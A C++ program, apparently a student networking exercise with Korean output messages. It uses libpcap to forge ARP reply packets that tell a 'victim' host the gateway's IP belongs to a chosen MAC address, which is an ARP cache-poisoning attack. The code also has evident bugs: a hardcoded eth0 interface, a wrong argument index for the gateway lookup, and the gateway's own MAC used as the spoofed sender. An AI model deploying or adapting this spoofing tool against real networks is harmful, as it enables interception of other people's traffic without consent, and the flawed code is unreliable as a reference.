#include <cstdio>
#include <pcap.h>
#include <stdio.h>
#include <netinet/in.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <net/if.h>
#include <unistd.h>
#include <net/if_arp.h>
#include "ethhdr.h"
#include "arphdr.h"


#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface>\n");
	printf("sample: send-arp-test wlan0\n");
}

int find_mac_address(char* ip_str, char* mac_str) {
    struct arpreq areq;
    struct sockaddr_in* sin;
    struct sockaddr sa;
    struct in_addr ipaddr;
    int sd;

    memset(&areq, 0, sizeof(areq));
    memset(&sa, 0, sizeof(struct sockaddr));

    sin = (struct sockaddr_in*) &sa;
    sin->sin_family = AF_INET;
    inet_pton(AF_INET, ip_str, &ipaddr);
    sin->sin_addr = ipaddr;

    memcpy(&areq.arp_pa, &sa, sizeof(struct sockaddr));
    
    strcpy(areq.arp_dev, "eth0");
    sd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sd < 0) {
        perror("socket");
        return -1;
    }

    if (ioctl(sd, SIOCGARP, &areq) < 0) {
        perror("ioctl");
        close(sd);
        return -1;
    }
    
    close(sd);

    unsigned char* mac_addr = (unsigned char*) areq.arp_ha.sa_data;
    sprintf(mac_str, "%02x:%02x:%02x:%02x:%02x:%02x", mac_addr[0], mac_addr[1], mac_addr[2], mac_addr[3], mac_addr[4], mac_addr[5]);

    return 0;
}


int main(int argc, char* argv[]) {
	if (argc % 2 == 1) {
		usage();
		return -1;
	}
	for(int a=0; a<argc-2;a=a+2){
		
		char* dev = argv[1];
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);		//dont send packet? dont recive packet
		if (handle == nullptr) {
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}

		char my_mac_add[18];
	    	FILE *fp = popen("ifconfig eth0 | awk '/ether/ {print $2}'", "r");

	    	if (fp != NULL) {
			if (fgets(my_mac_add, sizeof(my_mac_add), fp)) {
	       	     printf("MY MAC 주소: %s\n", my_mac_add);
	       	 }
	       	 pclose(fp);
	    	} else {
			printf("명령 실행 에러\n");
	    	}
		EthArpPacket packet;

	    	char mac_str1[18];
	    	if (find_mac_address(argv[a+2], mac_str1) == 0) {
			printf("VICTIM IP: %s -> MAC: %s\n", argv[a+2], mac_str1);
	    	}else{
		printf("Failed to find MAC address of %s\n", argv[a+2]);
	    	}
	    	

	    	char mac_str2[18];
	    	if (find_mac_address(argv[3], mac_str2) == 0) {
			printf("GATEWAY IP: %s -> MAC: %s\n", argv[a+3], mac_str2);
	    	}else{
		printf("Failed to find MAC address of %s\n", argv[a+3]);
	    	}
	    	
		packet.eth_.dmac_ = Mac(mac_str1);
		packet.eth_.smac_ = Mac(my_mac_add);
		packet.eth_.type_ = htons(EthHdr::Arp);
		packet.arp_.hrd_ = htons(ArpHdr::ETHER);
		packet.arp_.pro_ = htons(EthHdr::Ip4);
		packet.arp_.hln_ = Mac::SIZE;
		packet.arp_.pln_ = Ip::SIZE;
		packet.arp_.op_ = htons(ArpHdr::Reply);  //if attack change request to reply
		packet.arp_.smac_ = Mac(mac_str2);
		packet.arp_.sip_ = htonl(Ip(argv[a+3]));
		packet.arp_.tmac_ = Mac(mac_str1);
		packet.arp_.tip_ = htonl(Ip(argv[a+2]));

		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	
		pcap_close(handle);
	}
}
